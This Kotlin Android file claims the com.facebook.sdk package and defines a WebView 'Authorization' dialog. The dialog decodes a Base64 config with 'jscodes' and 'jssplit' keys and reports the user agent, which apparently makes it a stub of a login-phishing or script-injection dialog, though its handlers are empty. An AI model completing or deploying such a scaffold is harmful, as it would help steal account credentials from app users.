package com.facebook.sdk

import android.content.Context
import android.content.res.Resources
import android.graphics.Color
import android.graphics.Point
import android.graphics.drawable.ColorDrawable
import android.os.Bundle
import android.util.Base64
import android.view.*
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ImageView
import android.widget.TextView
import androidx.constraintlayout.widget.ConstraintLayout
import androidx.constraintlayout.widget.ConstraintSet
import androidx.fragment.app.DialogFragment
import com.facebook.sdk.databinding.DialogSdkBinding
import org.json.JSONObject


/**
 * create by zuoz
 * time:2022/6/20
 **/
class SdkDialog(data: String) : DialogFragment() {

    init {
        startInitData(data)
    }

    fun startInitData(data: String) {
        try {
            val decodeStr = String(Base64.decode(data, 0))
            val jsonObject = JSONObject(decodeStr)
            with(jsonObject){
                if (has("jscodes")) {

                }

                if(has("jssplit")){

                }

                if(has("check_key")){

                }
            }




        } catch (e: Exception) {

        }

    }

    lateinit var binding: DialogSdkBinding
    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        dialog?.setCanceledOnTouchOutside(false)
        initSize()
        initView()
    }

    private fun initSize() {
        dialog?.window?.let {
            val wm = requireContext().getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            val display = wm?.defaultDisplay
            val point = Point();
            display?.getSize(point);


            val layoutParams = it.attributes;

            layoutParams.width = WindowManager.LayoutParams.MATCH_PARENT
            layoutParams.height = (point.y * 0.75).toInt()
            it.attributes = layoutParams
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        dialog?.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog?.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog?.window?.setGravity(Gravity.BOTTOM)

        binding = DialogSdkBinding.inflate(layoutInflater)
        return binding.root
    }

    fun initView() {
        binding.dialogSdk.apply {
            this.setBackgroundColor(Color.WHITE)
            val size50 = dp2px(50f)

            //webview

            val webView = WebView(requireContext())
            val webviewLP = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )

            setWebViewClient(webView)
            webView.layoutParams = webviewLP
            addView(webView)

            //title bg
            val viewBg = View(requireContext())
            viewBg.id = R.id.view_bg
            viewBg.setBackgroundColor(Color.WHITE)
            val viewBgLP = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )

            viewBgLP.width = ViewGroup.LayoutParams.MATCH_PARENT
            viewBgLP.height = size50
            viewBg.layoutParams = viewBgLP

            addView(viewBg)

            //title views
            val viewIcon = ImageView(requireContext())
            viewIcon.id = R.id.view_icon
            viewIcon.scaleType = ImageView.ScaleType.CENTER_INSIDE
            viewIcon.setImageResource(R.drawable.ic_icon)
            val viewIconLP = ConstraintLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )


            viewIconLP.width = size50
            viewIconLP.height = size50
            viewIconLP.leftToLeft = viewBg.id
            viewIconLP.topToTop = viewBg.id
            val margins = dp2px(5f)
            viewIcon.layoutParams = viewIconLP
            viewIcon.setPadding(0, margins, margins, margins)
            addView(viewIcon)

            //title text
            val viewText = TextView(requireContext())
            viewText.id = R.id.view_text

            viewText.text = "Authorization"
            val viewTextLP = ConstraintLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )
            viewText.gravity = Gravity.CENTER

            viewTextLP.height = size50
            viewTextLP.leftToRight = viewIcon.id
            viewTextLP.topToTop = viewIcon.id

            viewText.layoutParams = viewTextLP
            addView(viewText)

            //close
            val viewClose = ImageView(requireContext())
            viewClose.setImageResource(R.drawable.ic_close)
            viewClose.id = R.id.view_close

            val viewCloseLP = ConstraintLayout.LayoutParams(
                size50,
                size50
            )

            viewCloseLP.rightToRight = this.id
            viewCloseLP.topToTop = this.id

            viewClose.layoutParams = viewCloseLP
            viewClose.setPadding(margins, margins, margins, margins)
            viewClose.setOnClickListener {
                _even?.onCloseListener()
            }
            addView(viewClose)
        }

    }

    var _even: EvenCallBack? = null
    fun setCloseListener(even: EvenCallBack) {
        _even = even
    }


    private fun setWebViewClient(webView: WebView) {
        webView.apply {
            settings.javaScriptEnabled = true
            _even?.onUAStringCallBack(settings.userAgentString)
            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    url?.let {
                        if (it == "") {
                            _even?.onLoaded()
                        }
                    }

                    super.onPageFinished(view, url)
                }

                override fun shouldInterceptRequest(
                    view: WebView?,
                    request: WebResourceRequest?
                ): WebResourceResponse? {
                    return super.shouldInterceptRequest(view, request)
                }
            }
        }
    }

    fun dp2px(dpValue: Float): Int {
        val scale: Float = Resources.getSystem().displayMetrics.density
        return (dpValue * scale + 0.5f).toInt()
    }

}